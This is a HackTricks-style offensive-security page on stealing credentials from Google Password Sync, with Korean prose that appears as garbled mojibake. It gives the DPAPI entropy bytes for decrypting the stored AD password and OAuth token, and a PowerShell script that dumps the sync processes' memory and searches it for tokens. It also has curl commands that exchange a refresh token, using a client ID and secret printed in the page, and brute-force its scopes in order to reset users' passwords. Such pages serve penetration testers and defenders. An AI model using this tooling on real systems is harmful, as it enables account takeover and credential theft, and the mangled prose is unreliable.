# GPS - Google Password Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** π’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** π¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

μ΄κ²ƒμ€ Googleμ΄ **ADμ™€ Workspace κ°„μ μ‚¬μ©μ λΉ„λ°€λ²νΈλ¥Ό λ™κΈ°ν™”ν•κΈ° μ„ν•΄ μ κ³µν•λ” λ°”μ΄λ„λ¦¬ λ° μ„λΉ„μ¤**μ…λ‹λ‹¤. μ‚¬μ©μκ°€ ADμ—μ„ λΉ„λ°€λ²νΈλ¥Ό λ³€κ²½ν•  λ•λ§λ‹¤ Googleμ— μ„¤μ •λ©λ‹λ‹¤.

μ΄κ²ƒμ€ `C:\Program Files\Google\Password Sync`μ— μ„¤μΉλλ©°, μ—¬κΈ°μ—μ„ κµ¬μ„±ν•  μ μλ” λ°”μ΄λ„λ¦¬ `PasswordSync.exe`μ™€ κ³„μ† μ‹¤ν–‰λ  μ„λΉ„μ¤ `password_sync_service.exe`λ¥Ό μ°Ύμ„ μ μμµλ‹λ‹¤.

### GPS - Configuration

μ΄ λ°”μ΄λ„λ¦¬(λ° μ„λΉ„μ¤)λ¥Ό κµ¬μ„±ν•λ ¤λ©΄ **Workspaceμ—μ„ Super Admin μ£Όμ²΄μ— λ€ν• μ•΅μ„Έμ¤λ¥Ό μ κ³µν•΄μ•Ό ν•©λ‹λ‹¤**:

* Googleμ„ ν†µν•΄ **OAuth**λ΅ λ΅κ·ΈμΈν• ν›„ **λ μ§€μ¤νΈλ¦¬μ— ν† ν°μ„ μ €μ¥ν•©λ‹λ‹¤(μ•”νΈν™”λ¨)**
* GUIκ°€ μλ” λ„λ©”μΈ μ»¨νΈλ΅¤λ¬μ—μ„λ§ μ‚¬μ© κ°€λ¥
* **Workspace μ‚¬μ©μ κ΄€λ¦¬** κ¶ν•μ΄ μλ” **GCPμ μ„λΉ„μ¤ κ³„μ • μκ²© μ¦λ…(json νμΌ)** μ κ³µ
* μ΄λ¬ν• μκ²© μ¦λ…μ€ λ§λ£λμ§€ μ•μΌλ―€λ΅ μ•…μ©λ  μ μμ–΄ λ§¤μ° λ‚μ μ•„μ΄λ””μ–΄μ…λ‹λ‹¤.
* SAκ°€ GCPμ—μ„ μ†μƒλ  μ μμΌλ―€λ΅ Workspaceμ— λ€ν• SA μ•΅μ„Έμ¤λ¥Ό μ κ³µν•λ” κ²ƒμ€ λ§¤μ° λ‚μ μ•„μ΄λ””μ–΄μ…λ‹λ‹¤.
* Googleμ€ GUIκ°€ μ—†λ” λ„λ©”μΈ μ μ–΄λ¥Ό μ„ν•΄ μ΄λ¥Ό μ”κµ¬ν•©λ‹λ‹¤.
* μ΄λ¬ν• μκ²© μ¦λ…λ„ λ μ§€μ¤νΈλ¦¬μ— μ €μ¥λ©λ‹λ‹¤.

ADμ™€ κ΄€λ ¨ν•μ—¬ ν„μ¬ **μ‘μ© ν”„λ΅κ·Έλ¨ μ»¨ν…μ¤νΈ, μµλ… λλ” νΉμ • μκ²© μ¦λ…**μ„ μ‚¬μ©ν•λ„λ΅ μ§€μ •ν•  μ μμµλ‹λ‹¤. μκ²© μ¦λ… μµμ…μ΄ μ„ νƒλλ©΄ **μ‚¬μ©μ μ΄λ¦„**μ€ **λ””μ¤ν¬**μ νμΌμ— μ €μ¥λκ³  **λΉ„λ°€λ²νΈ**λ” **μ•”νΈν™”λμ–΄** **λ μ§€μ¤νΈλ¦¬**μ— μ €μ¥λ©λ‹λ‹¤.

### GPS - Dumping password and token from disk

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)κ°€ **GPS**λ¥Ό κ°μ§€ν•κ³  κµ¬μ„±μ— λ€ν• μ •λ³΄λ¥Ό μ–»μΌλ©° **λΉ„λ°€λ²νΈμ™€ ν† ν°μ„ λ³µνΈν™”**ν•  μ μλ‹¤λ” μ μ— μ μν•μ„Έμ”.
{% endhint %}

νμΌ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`**μ—μ„ κµ¬μ„±μ μΌλ¶€λ¥Ό μ°Ύμ„ μ μμΌλ©°, μ—¬κΈ°μ—λ” κµ¬μ„±λ ADμ **`baseDN`**κ³Ό μ‚¬μ© μ¤‘μΈ μκ²© μ¦λ…μ **`username`**μ΄ ν¬ν•¨λ©λ‹λ‹¤.

λ μ§€μ¤νΈλ¦¬ **`HKLM\Software\Google\Google Apps Password Sync`**μ—μ„ **μ•”νΈν™”λ μƒλ΅ κ³ μΉ¨ ν† ν°**κ³Ό AD μ‚¬μ©μ(μλ” κ²½μ°)μ **μ•”νΈν™”λ λΉ„λ°€λ²νΈ**λ¥Ό μ°Ύμ„ μ μμµλ‹λ‹¤. λν•, ν† ν° λ€μ‹  **SA μκ²© μ¦λ…**μ΄ μ‚¬μ©λλ” κ²½μ°, ν•΄λ‹Ή λ μ§€μ¤νΈλ¦¬ μ£Όμ†μ—μ„ μ•”νΈν™”λ μκ²© μ¦λ…μ„ μ°Ύμ„ μ μμµλ‹λ‹¤. μ΄ λ μ§€μ¤νΈλ¦¬μ **κ°’**μ€ **κ΄€λ¦¬μ**λ§ **μ•΅μ„Έμ¤**ν•  μ μμµλ‹λ‹¤.

μ•”νΈν™”λ **λΉ„λ°€λ²νΈ**(μλ” κ²½μ°)λ” **`ADPassword`** ν‚¤ μ•μ— μμΌλ©° **`CryptProtectData`** APIλ¥Ό μ‚¬μ©ν•μ—¬ μ•”νΈν™”λ©λ‹λ‹¤. μ΄λ¥Ό λ³µνΈν™”ν•λ ¤λ©΄ λΉ„λ°€λ²νΈ λ™κΈ°ν™”λ¥Ό κµ¬μ„±ν• μ‚¬μ©μμ™€ λ™μΌν•΄μ•Ό ν•λ©°, **`CryptUnprotectData`**λ¥Ό μ‚¬μ©ν•  λ• μ΄ **μ—”νΈλ΅ν”Ό**λ¥Ό μ‚¬μ©ν•΄μ•Ό ν•©λ‹λ‹¤: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

μ•”νΈν™”λ ν† ν°(μλ” κ²½μ°)μ€ **`AuthToken`** ν‚¤ μ•μ— μμΌλ©° **`CryptProtectData`** APIλ¥Ό μ‚¬μ©ν•μ—¬ μ•”νΈν™”λ©λ‹λ‹¤. μ΄λ¥Ό λ³µνΈν™”ν•λ ¤λ©΄ λΉ„λ°€λ²νΈ λ™κΈ°ν™”λ¥Ό κµ¬μ„±ν• μ‚¬μ©μμ™€ λ™μΌν•΄μ•Ό ν•λ©°, **`CryptUnprotectData`**λ¥Ό μ‚¬μ©ν•  λ• μ΄ **μ—”νΈλ΅ν”Ό**λ¥Ό μ‚¬μ©ν•΄μ•Ό ν•©λ‹λ‹¤: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
λν•, **`0123456789abcdefghijklmnopqrstv`** μ‚¬μ „μ„ μ‚¬μ©ν•μ—¬ base32hexλ΅ μΈμ½”λ”©λ©λ‹λ‹¤.

μ—”νΈλ΅ν”Ό κ°’μ€ λ„κµ¬λ¥Ό μ‚¬μ©ν•μ—¬ λ°κ²¬λμ—μµλ‹λ‹¤. μ΄ λ„κµ¬λ” **`CryptUnprotectData`** λ° **`CryptProtectData`** νΈμ¶μ„ λ¨λ‹ν„°λ§ν•λ„λ΅ κµ¬μ„±λμ—μΌλ©°, κ·Έλ° λ‹¤μ `PasswordSync.exe`λ¥Ό μ‹¤ν–‰ν•κ³  λ¨λ‹ν„°λ§ν•λ” λ° μ‚¬μ©λμ—μµλ‹λ‹¤. μ΄ λ„κµ¬λ” κµ¬μ„±λ λΉ„λ°€λ²νΈμ™€ μΈμ¦ ν† ν°μ„ μ²μμ— λ³µνΈν™”ν•λ©°, λ‘ κ²½μ° λ¨λ‘ μ‚¬μ©λ **μ—”νΈλ΅ν”Ό** κ°’μ„ **ν‘μ‹ν•©λ‹λ‹¤**:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

μ΄ API νΈμ¶μ μ…λ ¥ λλ” μ¶λ ¥μ—μ„ **λ³µνΈν™”λ** κ°’μ„ λ³Ό μ μλ‹¤λ” μ μ— μ μν•μ„Έμ”(Winpeasκ°€ μ‘λ™μ„ λ©μ¶ κ²½μ°).

λΉ„λ°€λ²νΈ λ™κΈ°ν™”κ°€ **SA μκ²© μ¦λ…μΌλ΅ κµ¬μ„±λ κ²½μ°**, λ μ§€μ¤νΈλ¦¬ **`HKLM\Software\Google\Google Apps Password Sync`**μ ν‚¤ μ•μ— μ €μ¥λ©λ‹λ‹¤.

### GPS - Dumping tokens from memory

GCPWμ™€ λ§μ°¬κ°€μ§€λ΅ `PasswordSync.exe` λ° `password_sync_service.exe` ν”„λ΅μ„Έμ¤μ λ©”λ¨λ¦¬λ¥Ό λ¤ν”„ν•  μ μμΌλ©°, μ΄λ―Έ μƒμ„±λ κ²½μ° μƒλ΅ κ³ μΉ¨ λ° μ•΅μ„Έμ¤ ν† ν°μ„ μ°Ύμ„ μ μμµλ‹λ‹¤.\
AD κµ¬μ„± μκ²© μ¦λ…λ„ μ°Ύμ„ μ μμ„ κ²ƒμ…λ‹λ‹¤.

<details>

<summary>Dump <code>PasswordSync.exe</code> and the <code>password_sync_service.exe</code> processes and search tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - λ¦¬ν”„λ μ‹ ν† ν°μΌλ΅ μ•΅μ„Έμ¤ ν† ν° μƒμ„±

λ¦¬ν”„λ μ‹ ν† ν°μ„ μ‚¬μ©ν•μ—¬ λ‹¤μ λ…λ Ήμ— μ§€μ •λ ν΄λΌμ΄μ–ΈνΈ IDμ™€ ν΄λΌμ΄μ–ΈνΈ λΉ„λ°€μ„ μ‚¬μ©ν•μ—¬ μ•΅μ„Έμ¤ ν† ν°μ„ μƒμ„±ν•  μ μμµλ‹λ‹¤:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
λ¦¬ν”„λ μ‹ ν† ν°μ΄ μλ”λΌλ„, μ•΅μ„Έμ¤ ν† ν°μ„ μƒμ„±ν•λ” μ• ν”λ¦¬μΌ€μ΄μ…μ—μ„ μ§€μ›ν•λ” **μ¤μ½”ν”„λ§ μ”μ²­ν•  μ μκΈ° λ•λ¬Έμ—** μ•΅μ„Έμ¤ ν† ν°μ— λ€ν• μ¤μ½”ν”„λ¥Ό μ”μ²­ν•λ” κ²ƒμ€ λ¶κ°€λ¥ν•©λ‹λ‹¤.

λν•, λ¦¬ν”„λ μ‹ ν† ν°μ€ λ¨λ“  μ• ν”λ¦¬μΌ€μ΄μ…μ—μ„ μ ν¨ν•μ§€ μ•μµλ‹λ‹¤.
{% endhint %}

κΈ°λ³Έμ μΌλ΅ GPSλ” μ‚¬μ©μκ°€ λ¨λ“  κ°€λ¥ν• OAuth μ¤μ½”ν”„μ— μ ‘κ·Όν•  μ μ—†μΌλ―€λ΅, λ‹¤μ μ¤ν¬λ¦½νΈλ¥Ό μ‚¬μ©ν•μ—¬ `refresh_token`μΌλ΅ `access_token`μ„ μƒμ„±ν•λ” λ° μ‚¬μ©ν•  μ μλ” μ¤μ½”ν”„λ¥Ό μ°Ύμ„ μ μμµλ‹λ‹¤:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

κ·Έλ¦¬κ³  μ΄κ²ƒμ€ μ κ°€ μ‘μ„± λ‹Ήμ‹ λ°›μ€ μ¶λ ¥μ…λ‹λ‹¤:
```
https://www.googleapis.com/auth/admin.directory.user
```
μ–΄λ–¤ λ²”μ„λ¥Ό μ§€μ •ν•μ§€ μ•μΌλ©΄ μ–»λ” κ²ƒκ³Ό λ™μΌν•©λ‹λ‹¤.

{% hint style="danger" %}
μ΄ λ²”μ„λ΅ **κΈ°μ΅΄ μ‚¬μ©μμ λΉ„λ°€λ²νΈλ¥Ό μμ •ν•μ—¬ κ¶ν•μ„ μƒμΉμ‹ν‚¬ μ μμµλ‹λ‹¤**.
{% endhint %}

{% hint style="success" %}
AWS ν•΄ν‚Ή λ°°μ°κΈ° λ° μ—°μµν•κΈ°:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP ν•΄ν‚Ή λ°°μ°κΈ° λ° μ—°μµν•κΈ°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks μ§€μ›ν•κΈ°</summary>

* [**κµ¬λ… κ³„ν**](https://github.com/sponsors/carlospolop) ν™•μΈν•κΈ°!
* **π’¬ [**Discord κ·Έλ£Ή**](https://discord.gg/hRep4RUj7f) λλ” [**ν…”λ κ·Έλ¨ κ·Έλ£Ή**](https://t.me/peass)μ— μ°Έμ—¬ν•κ±°λ‚ **Twitter** π¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**λ¥Ό ν”λ΅μ°ν•μ„Έμ”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) λ° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) κΉƒν—λΈ λ¦¬ν¬μ§€ν† λ¦¬μ— PRμ„ μ μ¶ν•μ—¬ ν•΄ν‚Ή νμ„ κ³µμ ν•μ„Έμ”.**

</details>
{% endhint %}
